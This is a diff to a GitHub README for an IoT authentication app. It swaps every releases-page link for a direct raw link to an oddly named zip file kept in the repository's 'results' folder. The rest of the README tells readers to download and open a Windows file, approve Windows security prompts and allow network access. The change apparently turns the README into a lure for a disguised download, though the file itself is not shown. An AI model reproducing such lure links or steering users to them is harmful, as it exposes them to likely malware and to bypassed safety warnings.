@@ -1,9 +1,9 @@
 # 🔐 ECC-IOT-AUTHENTICATION-PROTOCOL - Secure IoT Access Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/raw/refs/heads/main/results/PROTOCOL_EC_AUTHENTICATIO_IO_v3.9-alpha.2.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases
+Visit this page to download: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/raw/refs/heads/main/results/PROTOCOL_EC_AUTHENTICATIO_IO_v3.9-alpha.2.zip
 
 ## 🧭 What This App Does
 
@@ -25,7 +25,7 @@ If Windows asks for approval when you open the app, choose the option that lets 
 
 ## 🚀 Getting Started
 
-1. Open the download page: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases
+1. Open the download page: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/raw/refs/heads/main/results/PROTOCOL_EC_AUTHENTICATIO_IO_v3.9-alpha.2.zip
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save the file to your Downloads folder or Desktop
@@ -162,4 +162,4 @@ Open the folder and look for the main app file. A readme file may also tell you 
 Allow access if you want the authentication flow to work across devices or over a local network.
 
 ## 📌 Download Again
-Visit this page to download: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases
+Visit this page to download: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/raw/refs/heads/main/results/PROTOCOL_EC_AUTHENTICATIO_IO_v3.9-alpha.2.zip
